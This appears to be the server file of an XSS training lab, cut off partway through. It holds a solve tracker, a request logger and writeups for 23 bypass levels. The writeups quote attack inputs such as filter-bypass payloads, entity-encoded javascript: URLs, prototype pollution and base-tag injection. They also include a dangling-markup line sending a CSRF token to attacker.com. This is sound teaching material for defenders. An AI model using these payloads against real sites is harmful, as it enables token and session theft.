const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Level 21: detect the CSRF token arriving at ANY endpoint (simulates attacker-controlled server)
app.use((req, res, next) => {
  if (req.method === 'GET'
      && req.path !== '/level/21'
      && req.path !== '/api/leak-check'
      && req.query.csrf_token
      && req.query.csrf_token.includes('SUPER_SECRET_TOKEN')) {
    level21Leaked = req.url;
  }
  next();
});

// In-memory store for stored XSS levels
const guestbook = [];

// In-memory state for Level 21
let level21Leaked = false;

// Solutions tracker — persisted to disk
const SOLUTIONS_FILE = path.join(__dirname, 'solutions.json');

function loadSolutions() {
  try {
    if (fs.existsSync(SOLUTIONS_FILE)) {
      return JSON.parse(fs.readFileSync(SOLUTIONS_FILE, 'utf8'));
    }
  } catch(e) { /* ignore corrupt file */ }
  return {};
}

function saveSolutions() {
  fs.writeFileSync(SOLUTIONS_FILE, JSON.stringify(solutions, null, 2));
}

const solutions = loadSolutions();

// ── Live Backend Interceptor (SSE) ─────────────────────────────────────────
const terminalSubscribers = [];
const terminalBuffers = {};
const TERMINAL_BUFFER_MAX = 150;
const TERMINAL_MAX_STR = 6000;

function terminalTruncate(str) {
  if (str == null) return '';
  const s = typeof str === 'string' ? str : String(str);
  if (s.length <= TERMINAL_MAX_STR) return s;
  return s.slice(0, TERMINAL_MAX_STR) + '\n… [truncated]';
}

function pushTerminalEntry(level, entry) {
  if (!terminalBuffers[level]) terminalBuffers[level] = [];
  terminalBuffers[level].push(entry);
  while (terminalBuffers[level].length > TERMINAL_BUFFER_MAX) terminalBuffers[level].shift();
}

/**
 * Global lab logger — broadcasts to SSE clients and retains a per-level ring buffer for replay.
 * @param {number} level - Lab level number (1–23)
 * @param {string} type - e.g. raw | filter | decode | info | success | warn
 * @param {*} data - string or JSON-serializable object (shown in terminal)
 */
function logToTerminal(level, type, data) {
  let message;
  if (typeof data === 'string') {
    message = terminalTruncate(data);
  } else {
    try {
      message = terminalTruncate(JSON.stringify(data, null, 2));
    } catch (e) {
      message = terminalTruncate(String(data));
    }
  }
  const entry = { ts: Date.now(), level, type, message };
  pushTerminalEntry(level, entry);
  const payload = JSON.stringify(entry);
  terminalSubscribers.forEach(sub => {
    if (sub.filterLevel != null && sub.filterLevel !== level) return;
    try {
      sub.res.write(`data: ${payload}\n\n`);
    } catch (e) { /* client gone */ }
  });
}

function terminalHeadersSnapshot(req) {
  const h = {
    host: req.headers.host,
    'user-agent': req.headers['user-agent'],
    'content-type': req.headers['content-type'],
    accept: req.headers.accept,
    referer: req.headers.referer
  };
  if (req.headers.cookie) h.cookie = '[present]';
  Object.keys(h).forEach(k => { if (h[k] === undefined) delete h[k]; });
  return h;
}

function logRawRequest(level, req) {
  const snap = {
    section: 'RAW REQUEST',
    method: req.method,
    path: req.path,
    url: req.originalUrl || req.url,
    query: req.query && Object.keys(req.query).length ? req.query : undefined,
    body: req.body && typeof req.body === 'object' && Object.keys(req.body).length ? req.body : undefined,
    headers: terminalHeadersSnapshot(req)
  };
  logToTerminal(level, 'raw', snap);
}

function logFilterLogic(level, stepName, before, after, extra) {
  const row = {
    section: 'FILTER LOGIC',
    step: stepName,
    before: terminalTruncate(String(before ?? '')),
    after: terminalTruncate(String(after ?? ''))
  };
  if (extra && typeof extra === 'object') Object.assign(row, extra);
  logToTerminal(level, 'filter', row);
}

// Writeups per level
const writeups = {
  1: {
    title: 'Reflected XSS — No Defenses',
    why: 'Your input was placed directly into the HTML response with zero encoding or filtering. The browser parsed your <code>&lt;script&gt;</code> tag (or any HTML you injected) as part of the page structure and executed it.',
    lesson: 'This is the most basic form of XSS. Any time user input is reflected into HTML without encoding, an attacker can inject arbitrary markup. The fix is simple: <strong>HTML-encode</strong> all user output (<code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, etc.).',
    realWorld: 'Search pages, error messages that reflect URL parameters, and 404 pages that display the requested path are classic targets for reflected XSS.'
  },
  2: {
    title: 'Stored XSS — Persistent Injection',
    why: 'Your payload was stored in the server\'s database (in-memory array) and rendered every time any user visits the page. Unlike reflected XSS, the attacker doesn\'t need the victim to click a crafted link.',
    lesson: 'Stored XSS is more dangerous than reflected because it affects <strong>every visitor</strong> automatically. The payload persists and can steal sessions, deface pages, or spread like a worm. Always sanitize on both input and output.',
    realWorld: 'Comment sections, forum posts, user profiles, chat applications, and any feature where user content is saved and displayed to others.'
  },
  3: {
    title: 'Script Tag Filter Bypass',
    why: 'The filter only blocked <code>&lt;script&gt;</code> tags, but dozens of other HTML elements can execute JavaScript through event handlers. Elements like <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>, <code>&lt;body&gt;</code>, <code>&lt;input&gt;</code>, <code>&lt;details&gt;</code>, and many more support <code>on*</code> event attributes.',
    lesson: 'Blocklist-based filtering (blocking specific tags) is fundamentally flawed. There are too many vectors to block them all. The correct approach is <strong>allowlist-based</strong>: only permit known-safe tags and attributes, or use contextual output encoding.',
    realWorld: 'Many WAFs and custom filters only block <code>&lt;script&gt;</code>. In bug bounties, always try alternative tags: <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>, <code>&lt;math&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;audio&gt;</code>, <code>&lt;marquee&gt;</code>, <code>&lt;details&gt;</code>.'
  },
  4: {
    title: 'Attribute Context Injection',
    why: 'Your input was placed inside a double-quoted HTML attribute value without encoding quotes. By injecting a <code>"</code> character, you closed the attribute, then added new attributes (like event handlers) or closed the tag entirely to inject new elements.',
    lesson: 'The <strong>injection context</strong> determines the exploit technique. In an attribute context, you need to break out of the quotes first. The defense is to HTML-encode quotes: <code>"</code> → <code>&amp;quot;</code> and <code>\'</code> → <code>&amp;#x27;</code>.',
    realWorld: 'Input fields that reflect values (search boxes, form pre-fills), meta tags with user-controlled content, and any attribute built from user input.'
  },
  5: {
    title: 'JavaScript String Context Injection',
    why: 'Your input was placed inside a JavaScript string literal. Even though angle brackets were HTML-encoded (preventing new tag injection), you could close the string with a quote character, then inject arbitrary JavaScript code.',
    lesson: 'HTML encoding alone is insufficient when the injection point is inside JavaScript. You need <strong>JavaScript-specific encoding</strong>: escape <code>\'</code> to <code>\\\'</code>, <code>"</code> to <code>\\"</code>, and <code>\\</code> to <code>\\\\</code>. Even better: avoid placing user input in inline JavaScript entirely. Use <code>data-*</code> attributes and read them with <code>getAttribute()</code>.',
    realWorld: 'Analytics scripts that embed user data, inline JS configuration objects, and any template that places user input inside <code>&lt;script&gt;</code> blocks.'
  },
  6: {
    title: 'Event Handler Blocklist Bypass',
    why: 'The filter blocked 12 common event handlers, but the HTML spec defines over 60 event handler attributes. Obscure handlers like <code>ontoggle</code>, <code>onwheel</code>, <code>onmousewheel</code>, <code>onpointerover</code>, <code>onanimationend</code>, <code>ontransitionend</code>, <code>onstart</code> (marquee), and <code>onpageshow</code> were not in the blocklist.',
    lesson: 'Event handler blocklists are an arms race you will always lose. New events are added to browsers regularly. The only safe approach is to <strong>strip all <code>on*</code> attributes</strong> with a pattern like <code>/on\\w+/</code>, or use a proper HTML sanitizer library like DOMPurify.',
    realWorld: 'WAFs frequently maintain incomplete event handler lists. Check the PortSwigger XSS cheat sheet for a comprehensive list of event handlers per browser.'
  },
  7: {
    title: 'Single-Pass Keyword Filter Bypass',
    why: 'The filter stripped keywords in a <strong>single pass</strong>. By nesting a keyword inside itself (e.g., <code>onerronerrorr</code>), when the inner <code>onerror</code> is removed, the remaining outer characters reassemble into <code>onerror</code>.',
    lesson: 'Single-pass string replacement is inherently bypassable. If you must filter by keyword removal, you need to <strong>loop until no more changes occur</strong> (recursive filtering). But even recursive filtering can be bypassed through encoding or alternative execution methods. Proper output encoding is always superior to input filtering.',
    realWorld: 'Many custom WAF rules and server-side filters use single-pass replacement. Always test nested payloads: <code>alalertert</code>, <code>&lt;scr&lt;script&gt;ipt&gt;</code>, <code>jajavascriptvascript:</code>.'
  },
  8: {
    title: 'DOM-Based XSS',
    why: 'The vulnerability was entirely in client-side JavaScript. The page read from <code>location.hash</code> (a <strong>source</strong>) and wrote it to <code>innerHTML</code> (a <strong>sink</strong>) without sanitization. The hash fragment is never sent to the server, making this invisible to server-side defenses.',
    lesson: 'DOM XSS requires analyzing client-side code for <strong>source-to-sink flows</strong>. Common sources: <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>postMessage</code>, <code>localStorage</code>. Dangerous sinks: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write()</code>, <code>eval()</code>, <code>setTimeout(string)</code>, <code>.href</code>.',
    realWorld: 'Single-page applications (SPAs) are riddled with DOM XSS. Client-side routing, template rendering, and dynamic content injection are all common vectors. Tools like DOM Invader (Burp Suite) help find these.'
  },
  9: {
    title: 'href Injection with Protocol Filter Bypass',
    why: 'The filter checked for <code>javascript:</code> as a string, but browsers decode HTML entities in attribute values before interpreting the URL scheme. By using HTML entities like <code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;...</code> to spell "javascript:", the server\'s regex didn\'t match, but the browser decoded the entities and executed the protocol handler.',
    lesson: 'Browsers perform <strong>multiple decoding passes</strong> in different contexts. In an HTML attribute, entities are decoded first, then the URL is interpreted. Filters that check the raw string miss encoded payloads. The safe approach: parse the URL properly, check the protocol after decoding, and only allow <code>http:</code>, <code>https:</code>, and <code>mailto:</code> schemes.',
    realWorld: 'Any feature that lets users provide URLs: profile links, redirect parameters, "share via" features, embedded content. The <code>javascript:</code> protocol in <code>&lt;a href&gt;</code> is a classic bug bounty finding.'
  },
  10: {
    title: 'Content Security Policy Bypass via JSONP',
    why: 'The CSP allowed <code>\'self\'</code> as a script source, meaning any JavaScript file served from the same origin was trusted. The <code>/api/jsonp</code> endpoint reflected user input into a JavaScript response. By loading it as a <code>&lt;script src&gt;</code>, the callback parameter became executable code — and since it\'s same-origin, the CSP allowed it.',
    lesson: 'CSP with <code>\'self\'</code> is only as secure as <strong>every endpoint on your origin</strong>. JSONP endpoints, file upload endpoints serving JS, error pages with JS content, and any user-controlled response in a JS MIME type can be abused. Prefer <code>\'nonce-...\'</code> or <code>\'strict-dynamic\'</code> over <code>\'self\'</code>.',
    realWorld: 'Many real-world CSP bypasses exploit JSONP endpoints (Google APIs, legacy services), Angular libraries loaded from CDNs (<code>\'unsafe-eval\'</code>), or base tag injection to redirect script loads.'
  },
  11: {
    title: 'Double Encoding Bypass',
    why: 'The WAF decoded your input once and checked for dangerous patterns — finding none. But the application behind the WAF decoded the input <strong>a second time</strong>, turning harmless-looking percent-encoded text like <code>%3C</code> into actual <code>&lt;</code> characters. The WAF only saw <code>%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> after its decode pass — just text with percent signs, not HTML tags or event handlers.',
    lesson: 'When multiple layers in the stack each URL-decode the input (reverse proxy, WAF, framework, application), a filter at one layer can be bypassed by encoding for the <strong>next</strong> layer. The fix: filters must decode input the same number of times as the application does, or better yet, apply output encoding at the final render step rather than relying on input filtering.',
    realWorld: 'Double encoding is one of the most common WAF bypass techniques. If a WAF URL-decodes once and checks, but the backend also URL-decodes, <code>%253C</code> passes the WAF as <code>%3C</code> but becomes <code>&lt;</code> on the server. This affects real-world WAFs like ModSecurity, Cloudflare (in older configs), and custom proxy chains. Always test <code>%25XX</code> encoding in bug bounties.'
  },
  12: {
    title: 'Client-Side Template Injection',
    why: 'Although all HTML tags were stripped server-side, the client-side template engine evaluated expressions inside <code>{{...}}</code> using <code>eval()</code>. Since template delimiters are plain text (not HTML tags), they survived the tag filter and were executed client-side.',
    lesson: 'Client-side template engines that use <code>eval()</code> or <code>Function()</code> to evaluate expressions are inherently dangerous when processing user input. This is a major risk in frameworks that support expression binding (AngularJS <code>{{...}}</code>, Vue.js <code>v-html</code>, etc.). Never pass user input through template expression evaluators.',
    realWorld: 'AngularJS sandbox escapes were a major bug class. Even with sandboxing, researchers repeatedly found ways to escape to arbitrary JS execution. Modern frameworks (Angular 2+, React) avoid <code>eval</code>, but legacy apps and custom template engines remain vulnerable.'
  },
  13: {
    title: 'postMessage XSS — Cross-Window Messaging',
    why: 'The page registered a <code>message</code> event listener that wrote <code>e.data</code> directly to <code>innerHTML</code> without checking <code>e.origin</code>. Any window (including the browser console, or a malicious page embedding this one in an iframe) could send a message with an XSS payload.',
    lesson: '<code>postMessage</code> is a common DOM XSS vector. Secure implementations must: (1) <strong>validate <code>e.origin</code></strong> against an allowlist, (2) <strong>validate/sanitize <code>e.data</code></strong> before using it, (3) never pass message data to dangerous sinks like <code>innerHTML</code> or <code>eval()</code>.',
    realWorld: 'OAuth popup flows, payment gateways, embedded widgets, and cross-domain iframe communication all use <code>postMessage</code>. Missing origin checks are a frequent finding in bug bounties. The attacker embeds the target in an iframe on their domain and sends malicious messages.'
  },
  14: {
    title: 'SVG Upload XSS',
    why: 'SVG files are XML-based and natively support JavaScript execution through event handler attributes (<code>onload</code>, <code>onmouseover</code>, etc.) and even <code>&lt;script&gt;</code> tags. The filter only stripped <code>&lt;script&gt;</code> tags but left SVG event handlers intact. When the SVG was rendered inline, the browser executed the event handlers.',
    lesson: 'SVG is one of the most dangerous file types for XSS. It supports inline scripting, event handlers, <code>&lt;foreignObject&gt;</code> (which can embed HTML), CSS <code>@import</code>, and external resource loading. If you must accept SVG uploads, either: (1) serve them with <code>Content-Disposition: attachment</code>, (2) serve from a separate sandbox domain, or (3) use a strict SVG sanitizer that strips all scripting.',
    realWorld: 'File upload features that accept SVGs (avatars, logos, images) are frequently vulnerable. Even Markdown renderers that allow inline SVGs can be exploited. Many CDNs serve uploaded SVGs with <code>Content-Type: image/svg+xml</code>, enabling script execution.'
  },
  15: {
    title: 'Mutation XSS — Template Blind Spot',
    why: 'The sanitizer used <code>querySelectorAll(\'*\')</code> to find and clean dangerous elements — but this DOM API <strong>does not traverse into <code>&lt;template&gt;</code> element content</strong>. Template content lives in a separate <code>DocumentFragment</code> that is opaque to standard DOM queries. The <code>&lt;img onerror=alert(1)&gt;</code> inside the template was never seen by the sanitizer, so it survived. After sanitization, the page instantiated all template elements by moving their content into the live DOM, causing the event handler to fire.',
    lesson: 'This is the core of mXSS: the sanitizer\'s view of the DOM differs from what actually executes. <code>querySelectorAll</code>, <code>getElementsByTagName</code>, and similar APIs all skip <code>&lt;template&gt;</code> content. Any post-sanitization step that promotes template content (framework rendering, <code>importNode</code>, cloning) re-introduces the unsanitized payload. The fix: either explicitly sanitize <code>template.content</code> recursively, or use DOMPurify which handles this case.',
    realWorld: 'Template blind spots affect real sanitizers in web component frameworks. DOMPurify had a similar bypass (CVE-2020-26870) where nested template elements evaded sanitization. Any app with a "sanitize then render" pipeline that processes templates is potentially vulnerable — this includes custom rich text editors, React SSR apps with dangerouslySetInnerHTML, and CMS comment renderers.'
  },
  16: {
    title: 'Recursive Filter Bypass via Context Escape',
    why: 'The recursive filter defeated all nesting and keyword tricks. But it only analyzed the <strong>top-level HTML context</strong>. By injecting an <code>&lt;iframe srcdoc="..."&gt;</code>, you created a new document context. HTML entities inside the <code>srcdoc</code> attribute are decoded by the browser when creating the iframe\'s document, reconstructing a payload that the server filter never saw as dangerous text.',
    lesson: 'Even the strongest server-side filter can be bypassed if you can <strong>escape to a different execution context</strong>. <code>srcdoc</code>, <code>data:</code> URLs, <code>&lt;object&gt;</code> tags, and <code>&lt;embed&gt;</code> elements can all create new browsing contexts where the filtered document\'s rules don\'t apply. Defense in depth requires CSP, not just filtering.',
    realWorld: 'This technique is relevant when facing strong WAFs. If the WAF filters the main document but you can inject an iframe with <code>srcdoc</code> or <code>src=data:text/html,...</code>, you get a clean execution context. Combined with HTML entity encoding, this bypasses most keyword-based filters.'
  },
  17: {
    title: 'The Polyglot — Multi-Context Injection',
    why: 'Your input appeared in three contexts: HTML body, an HTML attribute, and a JavaScript string. Each context has different parsing rules and different escaping requirements. The weakest context (the one with the least encoding applied) was the entry point for exploitation.',
    lesson: 'When the same input is used in multiple contexts, you must apply <strong>context-specific encoding for every context</strong>. HTML body needs entity encoding, attributes need attribute encoding (including quotes), and JavaScript strings need JS escaping. A single encoding function cannot protect all contexts. This is why frameworks with auto-escaping (React, Angular, Vue) are safer — they apply the right encoding for each context automatically.',
    realWorld: 'Polyglot payloads are useful in bug bounties when you\'re not sure where your input ends up, or when it appears in multiple places. Having a single payload that works across HTML, JS, and attribute contexts maximizes your chances of finding XSS during fuzzing.'
  },
  18: {
    title: 'DOM Clobbering — Overwriting Global Variables via HTML',
    why: 'The page\'s JavaScript read <code>window.config.href</code> to decide where to navigate. By injecting an HTML element with <code>id="config"</code>, you <strong>clobbered</strong> the global variable — replacing the JavaScript object with your DOM element. The browser\'s named access mechanism (<code>window[elementId]</code>) allowed your injected HTML to silently override application logic without executing any JavaScript.',
    lesson: 'DOM clobbering exploits the browser\'s automatic exposure of named elements on <code>window</code>. Any <code>id</code> or <code>name</code> attribute on an HTML element creates a <code>window</code> property. This means <code>&lt;a id=config href=...&gt;</code> overwrites <code>window.config</code> with the anchor element, and <code>window.config.href</code> returns the anchor\'s href. Defenses: use <code>Object.hasOwn()</code> or <code>hasOwnProperty()</code> checks, declare variables with <code>const/let</code> (block-scoped), or freeze config objects. Also consider using <code>Symbol</code> keys or a namespace object that can\'t be clobbered.',
    realWorld: 'DOM clobbering has been found in Google Search, Gmail, and several other major applications. It\'s particularly common in sanitized HTML contexts (like email clients and rich text editors) where JavaScript execution is blocked but HTML injection is possible. The HTML sanitizer DOMPurify specifically includes DOM clobbering protections. Bug bounty tip: look for code that reads from <code>window.*</code> without declaring the variable with <code>const/let</code>.'
  },
  19: {
    title: 'Prototype Pollution → XSS',
    why: 'The <code>merge()</code> function naively iterated over all properties of your JSON input, including <code>__proto__</code>. When it encountered <code>{"__proto__": {"html": "&lt;img...&gt;"}}</code>, it wrote to <code>target.__proto__</code> — which is <code>Object.prototype</code>. This polluted the prototype of ALL objects. When the render function later checked <code>config.html</code>, it found the value via prototype chain lookup even though <code>config</code> never had an <code>html</code> property directly.',
    lesson: 'Prototype pollution occurs when user input can modify <code>Object.prototype</code> through unsafe merge, clone, or extend operations. The <code>__proto__</code> property (and <code>constructor.prototype</code>) are the primary vectors. Once polluted, every object in the runtime inherits the attacker\'s values for any property it doesn\'t explicitly define. To prevent: (1) use <code>Object.create(null)</code> for merge targets, (2) blocklist <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> keys, (3) use <code>Map</code> instead of plain objects, (4) freeze <code>Object.prototype</code>.',
    realWorld: 'Prototype pollution has been found in lodash (<code>_.merge</code>, <code>_.defaultsDeep</code>), jQuery (<code>$.extend</code>), and hundreds of npm packages. In 2019, a prototype pollution in Lodash (CVE-2019-10744) affected millions of applications. Combined with gadgets (code that reads from prototype-pollutable properties and sinks into innerHTML/eval), it becomes a reliable XSS vector.'
  },
  20: {
    title: 'Base Tag Injection — Hijacking Relative URLs',
    why: 'By injecting <code>&lt;base href="/evil/"&gt;</code> before the page\'s script tag, you changed the base URL for all relative resource loads. The page\'s <code>&lt;script src="level20-app.js"&gt;</code> was a relative URL — instead of loading from <code>/level20-app.js</code>, it loaded from <code>/evil/level20-app.js</code>, which served attacker-controlled JavaScript.',
    lesson: 'The <code>&lt;base&gt;</code> element affects ALL relative URLs on the page: scripts, stylesheets, images, links, and form actions. If an attacker can inject a <code>&lt;base&gt;</code> tag, they can redirect script loads to their server while bypassing CSP (since the script\'s origin appears legitimate). Defense: (1) use the <code>base-uri</code> CSP directive to restrict <code>&lt;base&gt;</code> usage, (2) use absolute URLs for critical resources, (3) use Subresource Integrity (<code>integrity</code> attribute) on script tags.',
    realWorld: 'Base tag injection is a known CSP bypass technique. If CSP allows <code>\'self\'</code> but doesn\'t set <code>base-uri</code>, an attacker can inject <code>&lt;base&gt;</code> to redirect relative script loads. This has been used in real-world attacks against applications with strict CSP but missing <code>base-uri</code> directives.'
  },
  21: {
    title: 'Dangling Markup — Data Exfiltration Without Scripts',
    why: 'By injecting a tag with an unclosed attribute (like <code>&lt;img src="http://attacker.com/steal?</code>), the browser treats everything from the injection point to the next matching quote as part of the URL. The CSRF token in the hidden input was between your injection and the next <code>"</code>, so it was included in the image request URL — exfiltrating it without any JavaScript execution.',
    lesson: 'Dangling markup exploits HTML\'s tolerant parsing: an unclosed attribute "swallows" subsequent HTML content until a matching delimiter is found. This is a <strong>data exfiltration</strong> technique, not a code execution technique — it works even when all JavaScript vectors are blocked. Modern browsers mitigate some vectors (Chrome blocks <code>&lt;img&gt;</code> with newlines in URLs), but <code>&lt;meta refresh&gt;</code>, <code>&lt;a href&gt;</code>, <code>&lt;form action&gt;</code>, and <code>&lt;button formaction&gt;</code> remain viable. Defense: encode quotes in all output contexts and use CSP with strict <code>connect-src</code>.',
    realWorld: 'Dangling markup has been used to steal CSRF tokens, OAuth codes, and other secrets embedded in HTML. Google\'s security team has documented this technique extensively. It\'s particularly valuable when CSP blocks all script execution but the attacker can still inject HTML.'
  },
  22: {
    title: 'JSON Injection — Breaking Out of Script Context',
    why: 'Your input was placed inside a JSON string value within a trusted <code>&lt;script&gt;</code> block. The server escaped angle brackets (preventing HTML tag injection) but did not escape double quotes. By injecting <code>"</code>, you closed the JSON string, then injected arbitrary JavaScript that executed within the same nonced script block — completely bypassing CSP.',
    lesson: 'When user input is embedded in inline <code>&lt;script&gt;</code> blocks (as JSON, config objects, or template data), the attacker is already inside a trusted execution context. Escaping <code>&lt;</code> and <code>&gt;</code> prevents tag breakout but doesn\'t prevent breaking out of strings within the script. You must escape: <code>"</code> → <code>\\\\\"</code>, <code>\\\\</code> → <code>\\\\\\\\</code>, <code>/</code> → <code>\\\\/</code>, and line terminators. Better yet: use <code>JSON.stringify()</code> server-side, place data in <code>data-*</code> attributes, or use a separate API endpoint.',
    realWorld: 'This is one of the most common XSS patterns in modern web apps. Server-side rendering frameworks (Next.js, Nuxt, Rails) that embed state into <code>&lt;script&gt;</code> tags for hydration are frequent targets. CSP doesn\'t help because the injection is inside an already-trusted script block.'
  },
  23: {
    title: 'URL Scheme Bypass — HTML Entity Decoding Mismatch',
    why: 'The server checked the raw input string for <code>javascript:</code> and didn\'t find it — because you encoded one or more characters as HTML entities (e.g., <code>&amp;#106;</code> for "j"). However, when the browser rendered the <code>&lt;a href="..."&gt;</code>, it decoded the HTML entities in the attribute value before interpreting the URL scheme. The result: the browser saw <code>javascript:alert(1)</code> and executed it when the link was clicked.',
    lesson: 'This is a classic <strong>encoding mismatch</strong> between server-side filtering and browser-side parsing. The server operates on raw strings; the browser decodes HTML entities in attributes before processing URLs. To prevent this: (1) decode all HTML entities server-side before checking the URL scheme, (2) use a proper URL parser to extract the scheme after decoding, (3) allowlist only safe schemes (<code>http:</code>, <code>https:</code>, <code>mailto:</code>) rather than blocklisting dangerous ones.',
    realWorld: 'This exact technique has been found in countless bug bounties. Any feature that puts user input into <code>href</code>, <code>src</code>, <code>action</code>, or <code>formaction</code> attributes while filtering <code>javascript:</code> as a raw string is vulnerable. It appears in link-sharing features, redirect parameters, user profile URLs, and "click to call" implementations. The mismatch between server string matching and browser HTML parsing is one of the most fundamental security concepts in web security.'
  }
};

// API: Record a solved level
app.post('/api/solve', (req, res) => {
  const { level, payload, url } = req.body;
  if (!level) return res.status(400).json({ error: 'Missing level' });
  if (!solutions[level]) {
    solutions[level] = { solvedAt: new Date().toISOString(), payloads: [] };
  }
  if (payload && !solutions[level].payloads.includes(payload)) {
    solutions[level].payloads.push(payload);
  }
  saveSolutions();
  res.json({ ok: true, writeup: writeups[level] || null });
});

// API: Get all solutions
app.get('/api/solutions', (req, res) => {
  res.json(solutions);
});

// API: Reset all progress
app.post('/api/reset', (req, res) => {
  Object.keys(solutions).forEach(k => delete solutions[k]);
  saveSolutions();
  res.json({ ok: true });
});

// SSE: live backend interceptor (Burp-style logger)
app.get('/api/terminal-stream', (req, res) => {
  const ql = req.query.level;
  const filterLevel = ql !== undefined && ql !== '' ? parseInt(ql, 10) : NaN;
  const useFilter = !Number.isNaN(filterLevel);

  res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  if (typeof res.flushHeaders === 'function') res.flushHeaders();

  const sub = { res, filterLevel: useFilter ? filterLevel : null };
  terminalSubscribers.push(sub);

  if (useFilter && terminalBuffers[filterLevel]) {
    terminalBuffers[filterLevel].forEach(entry => {
      try {
        res.write(`data: ${JSON.stringify(entry)}\n\n`);
      } catch (e) { /* ignore */ }
    });
  }

  res.write(': stream open\n\n');

  const keepAlive = setInterval(() => {
    try {
      res.write(': ping\n\n');
    } catch (e) {
      clearInterval(keepAlive);
    }
  }, 20000);

  req.on('close', () => {
    clearInterval(keepAlive);
    const i = terminalSubscribers.indexOf(sub);
    if (i !== -1) terminalSubscribers.splice(i, 1);
  });
});

// ============================================================
// CHEAT SHEET
// ============================================================
app.get('/cheatsheet', (req, res) => {
  const levelMeta = {
    1: { name: 'Hello, Reflected XSS', diff: 'Easy', context: 'HTML Body', defense: 'None' },
    2: { name: 'Stored XSS Guestbook', diff: 'Easy', context: 'HTML Body (Stored)', defense: 'None' },
    3: { name: 'Script Tag Blocked', diff: 'Medium', context: 'HTML Body', defense: '&lt;script&gt; stripped' },
    4: { name: 'Attribute Injection', diff: 'Medium', context: 'HTML Attribute', defense: 'None' },
    5: { name: 'JavaScript Context', diff: 'Medium', context: 'JS String', defense: '&lt; &gt; encoded' },
    6: { name: 'Event Handler Blocklist', diff: 'Hard', context: 'HTML Body', defense: '12 event handlers blocked' },
    7: { name: 'Case & Keyword Filter', diff: 'Hard', context: 'HTML Body', defense: 'Single-pass keyword strip' },
    8: { name: 'DOM-Based XSS', diff: 'Hard', context: 'DOM (location.hash → innerHTML)', defense: 'No server-side reflection' },
    9: { name: 'href Injection', diff: 'Expert', context: 'href Attribute', defense: 'javascript: blocked' },
    10: { name: 'CSP Bypass', diff: 'Expert', context: 'HTML Body + CSP', defense: "script-src 'nonce' 'self'" },
    11: { name: 'Double Encoding', diff: 'Expert', context: 'HTML Body', defense: 'WAF decode + tag/handler/javascript: filter' },
    12: { name: 'Template Injection', diff: 'Expert', context: 'Client-side template', defense: 'All HTML tags stripped' },
    13: { name: 'postMessage XSS', diff: 'Expert', context: 'DOM (postMessage → innerHTML)', defense: 'No reflection, no form' },
    14: { name: 'SVG Upload XSS', diff: 'Expert', context: 'Inline SVG', defense: '&lt;script&gt; stripped' },
    15: { name: 'Mutation XSS', diff: 'Expert', context: 'DOMParser sanitizer + template render', defense: 'Scripts + event handlers stripped (querySelectorAll)' },
    16: { name: 'Recursive Filter', diff: 'Expert', context: 'HTML Body', defense: 'Recursive keyword loop' },
    17: { name: 'The Polyglot', diff: 'Expert', context: 'HTML + Attribute + JS', defense: '&lt;script&gt; stripped, " encoded' },
    18: { name: 'DOM Clobbering', diff: 'Expert', context: 'HTML Body → window globals', defense: '&lt;script&gt;/handlers/javascript: stripped' },
    19: { name: 'Prototype Pollution → XSS', diff: 'Expert', context: 'JSON merge → innerHTML', defense: 'No direct HTML injection' },
    20: { name: 'Base Tag Injection', diff: 'Expert', context: 'HTML Body (before scripts)', defense: 'CSP nonce + self, &lt;script&gt;/handlers stripped' },
    21: { name: 'Dangling Markup', diff: 'Expert', context: 'HTML Attribute', defense: 'All execution vectors blocked' },
    22: { name: 'JSON Injection', diff: 'Expert', context: 'JSON in &lt;script&gt; block', defense: 'CSP nonce, &lt; &gt; Unicode-escaped' },
    23: { name: 'URL Scheme Bypass', diff: 'Expert', context: 'a href attribute', defense: '&lt;script&gt;/handlers stripped, javascript: blocked' }
  };

  let rows = '';
  for (let i = 1; i <= 23; i++) {
    const meta = levelMeta[i];
    const sol = solutions[i];
    const diffColor = { Easy: '#3fb950', Medium: '#d29922', Hard: '#f85149', Expert: '#bc4dff' }[meta.diff];
    if (sol) {
      const payloads = sol.payloads.map(p => {
        const escaped = p.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
        return '<code style="display:block;margin:0.25rem 0;padding:0.4rem 0.6rem;background:#0d1117;border:1px solid #30363d;border-radius:4px;word-break:break-all;font-size:0.8rem;">' + escaped + '</code>';
      }).join('');
      rows += '<tr><td style="color:' + diffColor + ';font-weight:600;">Level ' + i + '</td><td>' + meta.name + '</td><td>' + meta.context + '</td><td>' + meta.defense + '</td><td style="color:#3fb950;">Solved</td><td>' + (payloads || '<span style="color:#484f58;">Not recorded</span>') + '</td></tr>';
    } else {
      rows += '<tr style="opacity:0.4;"><td style="color:' + diffColor + ';font-weight:600;">Level ' + i + '</td><td>' + meta.name + '</td><td>' + meta.context + '</td><td>' + meta.defense + '</td><td style="color:#484f58;">Unsolved</td><td><span style="color:#484f58;">&mdash;</span></td></tr>';
    }
  }

  const solvedCount = Object.keys(solutions).length;
  const totalPayloads = Object.values(solutions).reduce((a, s) => a + s.payloads.length, 0);
  const metaJSON = JSON.stringify(levelMeta);

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS Cheat Sheet</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0a0a0f; color: #c9d1d9; min-height: 100vh; padding: 2rem; }
    .nav { margin-bottom: 1.5rem; }
    .nav a { color: #58a6ff; text-decoration: none; font-size: 0.85rem; }
    h1 { font-size: 1.5rem; color: #e6edf3; margin-bottom: 0.5rem; }
    .subtitle { color: #8b949e; margin-bottom: 2rem; font-size: 0.9rem; }
